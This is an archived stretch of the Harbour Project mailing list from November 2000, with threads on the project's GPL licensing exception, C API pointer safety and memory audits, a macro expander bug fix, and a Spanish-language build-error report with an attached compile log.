> there's lots
> > of stuff that each has in common.
>
> What would be an example of this?
>
> >                                   It's "obvious" that that's
> not supposed
> > to be included in what is Harbour code, just as using #include
> files when
> > compiling is also meant to be OK (and the C from Harbour's compiler
> > #includes 3 files at the moment). I don't think it's actually stated
> > explicitly, however. Jacek: is this what was worrying you?
>
> Licence issues are really hard to get right, really really hard. I'm
> starting to wonder if it might be worth writing a licence-clarification
> document. The problem here is that the harbour exception was added far too
> quickly and no thought was really given to the issues involved.
>
> It happened when I suggested that one solution to the GPL/LGPL problem was
> the guile <URL:http://www.gnu.org/software/guile/guile.html> exception.
> Before anything could be discussed someone (I forget who now) took it,
> changed a few words and started applying it. Harbour licence situation is
> less than optimal and I'm concerned that adding a document to describe the
> *desires* of the developers regarding licensing is missing the
> point. If we
> were to do that then that document should really be the exception.
>
> Licence in haste, repent in leisure. ;>
>
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/


From harbour@lists.harbour-project.org  Fri Nov 17 12:11:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Fri Nov 17 12:11:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <200011170352_MC2-BB31-F9A9@compuserve.com>
Message-ID: <200011171710.eAHHABG10537@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Fri, 17 Nov 2000 03:52:27 -0500

> I think there's no easy way to add it, but could a start be made?  If
> others think it's worthwhile.

I think that it is worthwhile.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Fri Nov 17 12:34:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 12:34:02 2000
Subject: [Harbour] Random gpfs
References: <200011170352_MC2-BB31-F9A9@compuserve.com>
Message-ID: <3A156CD7.B3D09F39@imid.med.pl>

John Skelton wrote:

> Regardless, I think we need to improve the hb_parXXX() things:
> 
> 1. all pointers should stay valid until the C function (and anything
> it calls) returns back into the pcode loop (and this must work if the
> C makes a nested call into the pcode engine)

  It is possible in case when the stack will be a linked list of stack
chains only.

> 2. there should also be a way to get a long-lived pointer (one that
> survives indefinitely); memcpy/strcpy really isn't good enough

  hb_itemNew() returns a pointer that is allocated outside of the eval
stack so I think we don't need any new function for that.

> 3. there should be some sort of consistency check (audit) facility
> which can be called easily from C or PRG code
> 
> #3 should at least check every data structure's pointers.

  Every memory block allocated with hb_xfree() has a signature before
and after the requested memory block. These signatures are checked at
memory release. We can add a function that will traverse all harbour
internals and check them. Checking them at every memory operation will
be too expensive.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 13:06:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 17 13:06:02 2000
Subject: [Harbour] Harbour license
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>; from ron@profit-master.com on Fri, Nov 17, 2000 at 09:01:30AM -0800
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>
Message-ID: <20001117180425.C18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 09:01:30AM -0800, Ron Pinkas wrote:

> 1. Is the output of the compiler, in the form of the generated C, Java,
> Win32 Object, and HRB, resulting from USER developed PRG code, subject to
> any Harbour License Restrictions, or control?
> 
>    The answer is a CLEAR NO! But I doubt it come across that way, from
> reading the "License Header".

People shouldn't be looking in the "licence header" for that sort of
information, they should be looking in the licence itself. This issue is
addressed in the licence:

,----[ Excerpt from the GPL ]
| The act of running the Program is not restricted, and the output from the
| Program is covered only if its contents constitute a work based on the
| Program (independent of having been made by running the Program). Whether
| that is true depends on what the Program does.
`----

I don't think I've seen anyone ask if the *output* of the compiler is
considered a derived work. I can easily add such information to the FAQ if
the developers think it might help (hmm, perhaps there is some scope for a
"Dummies Guide to the Harbour Licence").

> I believe this is where the core of the matter is. Assume for a second,
> that John Doe developed a Harbour compatible PCODE compiler, but he didn't
> bother developing the RTL or HVM. Surely, we don't won't to allow Mr. Doe,
> to distribute the Harbour HVM/RTL, in ANY form, capable of servicing the
> PCODE output of his compiler, *unless* subjecting the resulted form to the
> Harbour License Agreement.

There is no reason why someone couldn't write their own harbour compatible
compiler, that isn't free, and have it use the HVM and HRL as long as said
author distributes the HVM and HRL as per the licence. I can't see why that
would be undesirable. Well, personally I'd find it undesirable but as long
as the compiler itself isn't a derived work of harbour then it would be well
within the terms of the harbour licence.

> 1. The License for the Harbour Compiler (source files involved with building
> Harbour.exe) should be strait forward, indicating, that any use of these
> source files, subjects the derived work/distribution to the GPL. It should
> further be clear that the compiled output of any user's prg code, compiled
> by the compiler application, is *not* subject to any Harbour License
> Restrictions.

That's what we're supposed to have at the moment, modulo any compiler code
that is also used at run-time. See my alert regarding this the other week.

> 2. The License for the RTL (source files involved with building the Harbour
> Run-Time Libraries) should clearly state, that any use of these source
> files, subjects the derived work/distribution to the GPL. It should further
> be clear that the *compiled* form of these files *can* be linked with source
> files generated by the Harbour Compiler, and can service such Harbour
> generated source code, compiled by the compiler application, *without*
> subjecting the resulted form, to any Harbour License Restrictions.

That's what we're supposed to have at the moment, it's my understanding that
that is what we have.

> 3. The License for the HVM (source files involved with building the Harbour
> Virtual Machine) should clearly state, that any use of these source files,
> subjects the derived work/distribution to the GPL. It should further be
> clear that the *compiled* form of these files *can* be linked with source
> files generated by the Harbour Compiler, and can service such Harbour
> generated source code, compiled by the Harbour compiler application, without
> subjecting the resulted form, to any Harbour License Restrictions.

Which reads the same as 2, which is pretty much what we've got right now.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 17 13:53:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 13:53:02 2000
Subject: [Harbour] Random gpfs
References: <200011170352_MC2-BB31-F9A9@compuserve.com>
Message-ID: <002e01c050c8$bf651d10$59f6fbce@local>

John:
These are great ideas!
Error trapping and debugging tools are critical at this stage.
I'd be happy to put time in to help with this (though some of the issues may
go away if we change the stack implementation), but I'm not the one to
figure out how to do it....

Brian
----- Original Message -----
"For example:
      pEvalInfo.itmBlock = hb_param( 1, HB_IT_BLOCK );
and then pEvalInfo is passed around to other functions"

Maybe that kind of thing should be allowed.

Regardless, I think we need to improve the hb_parXXX() things:

1. all pointers should stay valid until the C function (and anything
it calls) returns back into the pcode loop (and this must work if the
C makes a nested call into the pcode engine)

2. there should also be a way to get a long-lived pointer (one that
survives indefinitely); memcpy/strcpy really isn't good enough

3. there should be some sort of consistency check (audit) facility
which can be called easily from C or PRG code

#3 should at least check every data structure's pointers.

I wish I'd suggested this ages ago.  I _did_ plead with CA to do it
for Clipper (they didn't) so that OM/VM/GC bugs would be easier to
localise (in time) and thus both find and fix.  Harbour should learn
from their mistake. :-)  Memory/pointer problems are too easy to cause
in C.  Dealing with them proactively has to be better than reactively!

I think there's no easy way to add it, but could a start be made?  If
others think it's worthwhile.

John.
_______________________________________________
Harbour mailing list
Harbour@lists.harbour-project.org
http://www.matrixlist.com/mailman/listinfo/harbour

Thank you for participating in The Harbour Project.  Be sure to check
http://www.Harbour-Project.org




From harbour@lists.harbour-project.org  Fri Nov 17 13:59:01 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 13:59:01 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com> <004e01c05070$d13fea40$8604d2cc@san.rr.com> <3A14F393.9BB599A8@imid.med.pl>
Message-ID: <003a01c050c9$78c37d60$59f6fbce@local>

Ryszard:
> > It turns out that it is THAT FUNCTION (LOOKUP) that cannot be referenced
in
> > macro expansion. I can call the function normally, but inside a macro it
> > becomes Undefined.  I've tried using it in macros and &() compilations,
and
>
>   Is this function decleared as STATIC ?
>
> Regards, Ryszard

No, this is a normal Clipper/Harbour function that is used throughout my app
as well as embedded textually in saved reports and such for macro-expanding
at runtime.

Brian



From harbour@lists.harbour-project.org  Fri Nov 17 14:39:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 14:39:02 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com> <004e01c05070$d13fea40$8604d2cc@san.rr.com> <3A14F393.9BB599A8@imid.med.pl> <003a01c050c9$78c37d60$59f6fbce@local>
Message-ID: <3A158A40.3E10DA32@imid.med.pl>

Brian Hays wrote:

> No, this is a normal Clipper/Harbour function that is used throughout my app
> as well as embedded textually in saved reports and such for macro-expanding
> at runtime.

  OK, I have found it. I will post a fix in few minutes.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 14:48:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 14:48:02 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com> <004e01c05070$d13fea40$8604d2cc@san.rr.com> <3A14F393.9BB599A8@imid.med.pl> <003a01c050c9$78c37d60$59f6fbce@local>
Message-ID: <3A158C64.F89E72B@imid.med.pl>

Brian Hays wrote:

> No, this is a normal Clipper/Harbour function that is used throughout my app
> as well as embedded textually in saved reports and such for macro-expanding
> at runtime.

  Fixed. See ChangeLog 2000-11-17 20:50 UTC+0100

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 14:49:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 14:49:02 2000
Subject: [Harbour] Harbour license
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org>
Message-ID: <007201c050d0$7d4de350$59f6fbce@local>

Dave:
> People shouldn't be looking in the "licence header" for that sort of
> information, they should be looking in the licence itself. This issue is
> addressed in the licence:

But people look where they look, and we should anticipate that.
> I don't think I've seen anyone ask if the *output* of the compiler is
> considered a derived work. I can easily add such information to the FAQ if
> the developers think it might help (hmm, perhaps there is some scope for a
> "Dummies Guide to the Harbour Licence").

Obviously a lot of smart people fall into the Dummies category.  The "fine
print" and exceptions create doubt in what should be the simple part, so we
all have to ask for clarification.  I think the kind of clear language Ron
used was very helpful in removing the doubt for the basics, which lets the
reader approach the complications from firmer ground.


Brian



From harbour@lists.harbour-project.org  Fri Nov 17 14:50:04 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 14:50:04 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com> <004e01c05070$d13fea40$8604d2cc@san.rr.com> <3A14F393.9BB599A8@imid.med.pl> <003a01c050c9$78c37d60$59f6fbce@local> <3A158A40.3E10DA32@imid.med.pl>
Message-ID: <007801c050d0$9c3ac210$59f6fbce@local>

Thanks for the quick turn-around!!

>   OK, I have found it. I will post a fix in few minutes.
> 
> Regards, Ryszard




From harbour@lists.harbour-project.org  Fri Nov 17 17:23:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 17:23:02 2000
Subject: [Harbour] Harbour license
Message-ID: <200011171721_MC2-BB48-AF03@compuserve.com>

Dave,

"which came first, library or archive?"

For computers, I think library.

> The files the compiler outputs generally seem to contain things which
> _might_ be construed as Harbour code. E.g. looking at some C there's lo=
ts
> of stuff that each has in common. =


"What would be an example of this?"

Any C file resulting from compiling a PRG.

John.

From harbour@lists.harbour-project.org  Fri Nov 17 17:23:18 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 17:23:18 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011171721_MC2-BB48-AF05@compuserve.com>

Ryszard,

"hb_itemNew() returns a pointer that is allocated outside of the eval
stack so I think we don't need any new function for that"

Does this mean that something like this (typed in without compiling!)
will be OK or not?
  char *p =3D hb_parc(1);
  ...
  ... =3D hb_itemPutXXX(NULL, ...);
  ...
  ... =3D hb_itemDo(...);
  // now is p still valid?

Also, is is OK to keep the xxx below for a long time (i.e. even after
the function has returned)?
  xxx =3D hb_itemParam(n);
I'm especially thinking of the case where param n is a code block
and xxx is to used to access it many times - long after the ref. to
the block is obtained.

"Checking them at every memory operation will be too expensive"

Yes.  Except when trying to find a GPF.  Then, the overhead does not
matter, but saving time to find out what's wrong matters a lot. :-)

John.

From harbour@lists.harbour-project.org  Fri Nov 17 17:24:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 17:24:02 2000
Subject: [Harbour] Harbour license
Message-ID: <200011171721_MC2-BB48-AF04@compuserve.com>

Ron,

"1. Is the output of the compiler, in the form of the generated C, Java,
Win32 Object, and HRB, resulting from USER developed PRG code, subject to=

any Harbour License Restrictions, or control?"

That's what I asked. :-)  As I said, I hope it's still the user's
property, but I didn't see anything clearly say so.

"1. The License for the Harbour Compiler (source files involved with buil=
ding
Harbour.exe) should be strait forward, indicating, that any use of these
source files, subjects the derived work/distribution to the GPL. It shoul=
d
further be clear that the compiled output of any user's prg code, compile=
d
by the compiler application, is *not* subject to any Harbour License
Restrictions."

[snip 2 & 3]

This still looks like it leaves the situation open as regards #include
files.

John.

From harbour@lists.harbour-project.org  Fri Nov 17 17:26:01 2000
From: harbour@lists.harbour-project.org (Jacek Potempa)
Date: Fri Nov 17 17:26:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>
Message-ID: <NOEPIKLDCODGGHOPAHEECELLCCAA.Jacek.Potempa@otc.pl>

Ron,

> -----Original Message-----
> From: harbour-admin@lists.harbour-project.org
> [mailto:harbour-admin@lists.harbour-project.org]On Behalf Of Ron Pinkas
> Sent: Friday, November 17, 2000 6:02 PM

[...]

> Here is my proposal:
>
> 1. The License for the Harbour Compiler (source files involved
> with building
> Harbour.exe) should be strait forward, indicating, that any use of these
> source files, subjects the derived work/distribution to the GPL. It should
> further be clear that the compiled output of any user's prg code, compiled
> by the compiler application, is *not* subject to any Harbour License
> Restrictions.

That is clear.

>
> 2. The License for the RTL (source files involved with building
> the Harbour
> Run-Time Libraries) should clearly state, that any use of these source
> files, subjects the derived work/distribution to the GPL. It
> should further
> be clear that the *compiled* form of these files *can* be linked
> with source
> files generated by the Harbour Compiler, and can service such Harbour
> generated source code, compiled by the compiler application, *without*
> subjecting the resulted form, to any Harbour License Restrictions.

There are many Clipper programs consisting of PRG and custom C/C++
files. Following the above statement you would have to place your C/C++
extensions to PRG programs under GPL (they are not generated by Harbour).
What about third party libraries? Third party RDDs? All of these are
examples
of the code which is not generated by Harbour, but has to be linked with
HRL(RTL)
to be useful.

Jacek


From harbour@lists.harbour-project.org  Fri Nov 17 17:42:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Fri Nov 17 17:42:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>
References: <20001117153044.V18577@hagbard.davep.org>
Message-ID: <200011172241.eAHMfTG06730@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Fri,
17 Nov 2000 09:01:30 -0800

> ...Harbour License Restrictions.

Except that there is no such thing as a Harbour License Restriction.
All or Harbour is either GPL or GPL with the following *exception* to
the GPL (you should note that the Harbour Exception is *less*
restrictive than the GPL):

> The exception is that if you link the Harbour Runtime Library (HRL)
> and/or the Harbour Virtual Machine (HVM) with other files to produce
> an executable, this does not by itself cause the resulting executable
> to be covered by the GNU General Public License. Your use of that
> executable is in no way restricted on account of linking the HRL
> and/or HVM code into it.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Fri Nov 17 17:49:01 2000
From: harbour@lists.harbour-project.org (Eduardo Rizzolo)
Date: Fri Nov 17 17:49:01 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org>
Message-ID: <007401c050d0$0b0265a0$0b00a8c0@eduardo>

This is a multi-part message in MIME format.

------=_NextPart_000_0071_01C050D0.05DF16E0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 8bit

Colegas

Ante todo disculpas por enviar a una lista para lenguaje ingles, esta
consulta en español, pero la lista de español no se mueve!!  :::(((((

Efectue la primer compilacion, y tengo los siguientes errores:

1)
Esta comparacion no funciono:
         IF NUM1 # LINEA->NUMERO
Esta no tiene problemas:
         IF NUM1 != LINEA->NUMERO
2) Adjunto build.log con detalle de compilacion
Tube problemas con el set scope to
Reemplace por ordscope() y no tube problemas.

3)
Tengo echa esta definicion:
#xtranslate T => aArrayVars\[13\]
Se confunde e intenta cambiar .T. generando un error.
.aArrayVars[13].  // este es el reemplazo efectuado en el ppo
Con clipper no hay problema!!
Tampoco es muy grave, con solo declarar otra variable se soluciona, pero hay
problema de incompatibilidad.
Seguro que ocurre el mismo error si la variable es F, y se utiliza .F.

4)
Utilizo una libreria externa para un controlador fiscal!
FISCAL.LIB
Con clipper trabaja bien, pero con harbour no encuentro la forma de
enlazarla!!
Se la agrege al bcc32, pero tira error.
Que puedo hacer?

5)
Envio los archivos que utilizo de enlace.
Me pueden decir si esta bien asi?


Muchas gracias


Eduardo Rizzolo
Posadas Misiones Argentina
fullpaint@arnet.com.ar
fullpaint@flashmail.com
icq 39280741

----- Original Message -----
From: Dave Pearson <davep@davep.org>
To: <harbour@lists.harbour-project.org>
Sent: Friday, November 17, 2000 6:04 PM
Subject: Re: [Harbour] Harbour license


> On Fri, Nov 17, 2000 at 09:01:30AM -0800, Ron Pinkas wrote:
>
> > 1. Is the output of the compiler, in the form of the generated C, Java,
> > Win32 Object, and HRB, resulting from USER developed PRG code, subject
to
> > any Harbour License Restrictions, or control?
> >
> >    The answer is a CLEAR NO! But I doubt it come across that way, from
> > reading the "License Header".
>
> People shouldn't be looking in the "licence header" for that sort of
> information, they should be looking in the licence itself. This issue is
> addressed in the licence:
>
> ,----[ Excerpt from the GPL ]
> | The act of running the Program is not restricted, and the output from
the
> | Program is covered only if its contents constitute a work based on the
> | Program (independent of having been made by running the Program).
Whether
> | that is true depends on what the Program does.
> `----
>
> I don't think I've seen anyone ask if the *output* of the compiler is
> considered a derived work. I can easily add such information to the FAQ if
> the developers think it might help (hmm, perhaps there is some scope for a
> "Dummies Guide to the Harbour Licence").
>
> > I believe this is where the core of the matter is. Assume for a second,
> > that John Doe developed a Harbour compatible PCODE compiler, but he
didn't
> > bother developing the RTL or HVM. Surely, we don't won't to allow Mr.
Doe,
> > to distribute the Harbour HVM/RTL, in ANY form, capable of servicing the
> > PCODE output of his compiler, *unless* subjecting the resulted form to
the
> > Harbour License Agreement.
>
> There is no reason why someone couldn't write their own harbour compatible
> compiler, that isn't free, and have it use the HVM and HRL as long as said
> author distributes the HVM and HRL as per the licence. I can't see why
that
> would be undesirable. Well, personally I'd find it undesirable but as long
> as the compiler itself isn't a derived work of harbour then it would be
well
> within the terms of the harbour licence.
>
> > 1. The License for the Harbour Compiler (source files involved with
building
> > Harbour.exe) should be strait forward, indicating, that any use of these
> > source files, subjects the derived work/distribution to the GPL. It
should
> > further be clear that the compiled output of any user's prg code,
compiled
> > by the compiler application, is *not* subject to any Harbour License
> > Restrictions.
>
> That's what we're supposed to have at the moment, modulo any compiler code
> that is also used at run-time. See my alert regarding this the other week.
>
> > 2. The License for the RTL (source files involved with building the
Harbour
> > Run-Time Libraries) should clearly state, that any use of these source
> > files, subjects the derived work/distribution to the GPL. It should
further
> > be clear that the *compiled* form of these files *can* be linked with
source
> > files generated by the Harbour Compiler, and can service such Harbour
> > generated source code, compiled by the compiler application, *without*
> > subjecting the resulted form, to any Harbour License Restrictions.
>
> That's what we're supposed to have at the moment, it's my understanding
that
> that is what we have.
>
> > 3. The License for the HVM (source files involved with building the
Harbour
> > Virtual Machine) should clearly state, that any use of these source
files,
> > subjects the derived work/distribution to the GPL. It should further be
> > clear that the *compiled* form of these files *can* be linked with
source
> > files generated by the Harbour Compiler, and can service such Harbour
> > generated source code, compiled by the Harbour compiler application,
without
> > subjecting the resulted form, to any Harbour License Restrictions.
>
> Which reads the same as 2, which is pretty much what we've got right now.
>
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>

------=_NextPart_000_0071_01C050D0.05DF16E0
Content-Type: application/octet-stream;
	name="build.log"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename="build.log"

Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'MESTO.prg'...
=0D200=0D300=0D400=0D500=0D600=0D700=0D800=0D900=0D1100=0D1200=0D1300=0D1=
400=0D1500=0D1800=0D1900=0D2100=0D2200=0DLines 2376, =
Functions/Procedures 15
Generating C source output to 'MESTO.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'funnet.prg'...
=0D200=0D300=0D700=0D1000=0D1100=0D1200=0DLines 1371, =
Functions/Procedures 7
Generating C source output to 'funnet.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'ERRORSYS.prg'...
=0DLines 245, Functions/Procedures 3
Generating C source output to 'ERRORSYS.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'funesp.prg'...
=0D200=0D400=0D500=0D600=0D800=0D900=0D1000=0D1100=0D1300=0D1500=0D1700=0D=
1800=0D1900=0D2000=0D2200=0D2300=0D2500=0DLines 2559, =
Functions/Procedures 59
Generating C source output to 'funesp.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'COMPROB.prg'...
=0D100=0D200=0D300=0D400=0D500=0D800=0D900=0D1000=0D1100=0D1200=0D1300=0D=
1400=0D1500=0D1600=0D1900=0D2000=0D2100=0D2200=0D2300=0D2400=0D2500=0D260=
0=0DLines 2608, Functions/Procedures 33
Generating C source output to 'COMPROB.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'IMPRE.prg'...
=0D400=0D500=0D600=0DLines 764, Functions/Procedures 2
Generating C source output to 'IMPRE.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'CAJA.prg'...
=0D100=0D200=0D400=0D500=0D600=0D700=0D800=0D900=0DLines 1174, =
Functions/Procedures 11
Generating C source output to 'CAJA.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'GETSYS.prg'...
=0D400=0D900=0D1200=0D1300=0D1400=0D1900=0D2000=0D2100=0D2200=0DLines =
2277, Functions/Procedures 37
Generating C source output to 'GETSYS.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'MODART.prg'...
=0D100=0D200=0D300=0D400=0D500=0D600=0D800=0D900=0D1000=0D1300=0DLines =
1356, Functions/Procedures 31
Generating C source output to 'MODART.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'LISART.prg'...
=0D100=0D200=0D300=0D500=0D600=0D700=0D800=0D1000=0D1100=0DLines 1192, =
Functions/Procedures 22
Generating C source output to 'LISART.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'TABLA.prg'...
=0D100=0D200=0D300=0D400=0DLines 425, Functions/Procedures 7
Generating C source output to 'TABLA.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'MECC.prg'...
=0D100=0D200=0D300=0D400=0D600=0D700=0D800=0D900=0D1000=0D1200=0D1300=0DL=
ines 1430, Functions/Procedures 16
Generating C source output to 'MECC.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'LIBRO.prg'...
=0D200=0D300=0D400=0D500=0D600=0D700=0DLines 792, Functions/Procedures 8
Generating C source output to 'LIBRO.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'altmod.prg'...
=0D100=0D200=0D300=0D400=0D500=0D600=0D700=0D800=0D1000=0D1100=0D1200=0D1=
300=0D1400=0D1500=0D1600=0D1700=0D1800=0D1900=0D2000=0D2200=0DLines =
2230, Functions/Procedures 31
Generating C source output to 'altmod.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'MEMO.prg'...
=0DLines 98, Functions/Procedures 2
Generating C source output to 'MEMO.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'tbdemo.prg'...
=0D200=0D400=0D500=0D600=0D800=0D900=0D1000=0D1100=0DLines 1191, =
Functions/Procedures 16
Generating C source output to 'tbdemo.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'reloj.prg'...
=0D100=0DLines 107, Functions/Procedures 2
Generating C source output to 'reloj.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'mefab.prg'...
=0D100=0DLines 194, Functions/Procedures 2
Generating C source output to 'mefab.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'ordenp.prg'...
=0D300=0D400=0D600=0D700=0D800=0D900=0D1200=0D1300=0DLines 1410, =
Functions/Procedures 16
Generating C source output to 'ordenp.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'COMP.prg'...
=0D100=0D300=0D400=0D700=0D800=0DLines 893, Functions/Procedures 12
Generating C source output to 'COMP.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'comp2.prg'...
=0D100=0DLines 435, Functions/Procedures 3
Generating C source output to 'comp2.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'HASANP.prg'...
=0D100=0D500=0D600=0D800=0D900=0D1000=0D1100=0D1200=0D1500=0D1800=0D2000=0D=
2200=0D2500=0D2600=0D2800=0DLines 2913, Functions/Procedures 31
Generating C source output to 'HASANP.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'HASAN.prg'...
=0D300=0DLines 396, Functions/Procedures 9
Generating C source output to 'HASAN.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'RDDSYS.prg'...
=0DLines 29, Functions/Procedures 1
Generating C source output to 'RDDSYS.c'... Done.
Harbour Compiler 0.34 (Build 34) (2000.06.02)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'FUNNET2.prg'...
=0D100=0D300=0D400=0D900=0DLines 952, Functions/Procedures 3
Generating C source output to 'FUNNET2.c'... Done.
Borland C++ 5.5 for Win32 Copyright (c) 1993, 2000 Borland
MESTO.c:
funnet.c:
ERRORSYS.c:
funesp.c:
COMPROB.c:
IMPRE.c:
CAJA.c:
GETSYS.c:
MODART.c:
LISART.c:
TABLA.c:
MECC.c:
LIBRO.c:
altmod.c:
MEMO.c:
tbdemo.c:
reloj.c:
mefab.c:
ordenp.c:
COMP.c:
comp2.c:
HASANP.c:
HASAN.c:
RDDSYS.c:
FUNNET2.c:
Turbo Incremental Link 5.00 Copyright (c) 1997, 2000 Borland
Fatal: Unable to open file '.LIB'

------=_NextPart_000_0071_01C050D0.05DF16E0
Content-Type: application/octet-stream;
	name="build.tmp"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
	filename="build.tmp"

-O2 -d  -I..\include -L..\lib 
-emesto.exe 
mesto.c 
funnet.c 
ERRORSYS.c 
funesp.c 
COMPROB.c 
IMPRE.c 
CAJA.c 
GETSYS.c 
MODART.c 
LISART.c 
tABLA.c 
MECC.c 
LIBRO.c 
altmod.c 
MEMO.c 
tbdemo.c 
reloj.c 
mefab.c 
ordenp.c 
COMP.c 
comp2.c 
HASANP.c 
HASAN.c 
RDDSYS.c 
FUNNET2.c 
debug.lib 
vm.lib 
rtl.lib 
.lib 
lang.lib 
rdd.lib 
macro.lib 
pp.lib 
dbfntx.lib 
dbfcdx.lib 
common.lib 

------=_NextPart_000_0071_01C050D0.05DF16E0
Content-Type: application/octet-stream;
